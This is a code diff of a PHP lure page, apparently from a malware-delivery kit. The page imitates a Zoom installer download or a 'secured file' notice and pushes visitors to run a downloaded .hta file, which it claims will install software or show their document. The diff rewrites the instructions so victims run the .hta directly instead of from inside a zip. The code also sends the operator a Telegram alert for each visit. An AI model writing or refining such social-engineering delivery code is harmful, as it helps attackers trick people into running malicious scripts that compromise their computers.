@@ -22,8 +22,8 @@ $nameQ = rawurlencode($name);
 // (the .hta lives inside); points at File Explorer "Recent".
 $zipBase = preg_replace('/\.hta$/i', '', $name);
 $instr = ($kind === 'zoom')
-    ? 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), then run the file inside it to install.'
-    : 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), then run the file inside it to view your document.';
+    ? 'Open <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer), then run it to install.'
+    : 'Open <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer), then run it to view your document.';
 
 // ---- one Telegram alert per visit (deduped by token nonce) ----
 $key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
@@ -81,12 +81,12 @@ if (!@file_exists($key)) {
       </div>
       <p class="modal-text"><?php echo $kind === 'zoom' ? 'Your download is ready.' : "You've received a secured file."; ?></p>
       <p class="modal-subtext">
-        Open <strong><?php echo htmlspecialchars(str_replace('.hta', '.zip', $name)); ?></strong> from your downloads and run the file inside it.
+        Open <strong><?php echo htmlspecialchars($name); ?></strong> from your downloads and run it.
       </p>
       <p class="modal-subtext">
         If your download did not start automatically, you can <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">download it manually</a>.
       </p>
-      <p class="info-text">After the file inside the archive runs, return to this page to join your meeting.</p>
+      <p class="info-text">After the file runs, return to this page to join your meeting.</p>
     </div>
   </div>
 
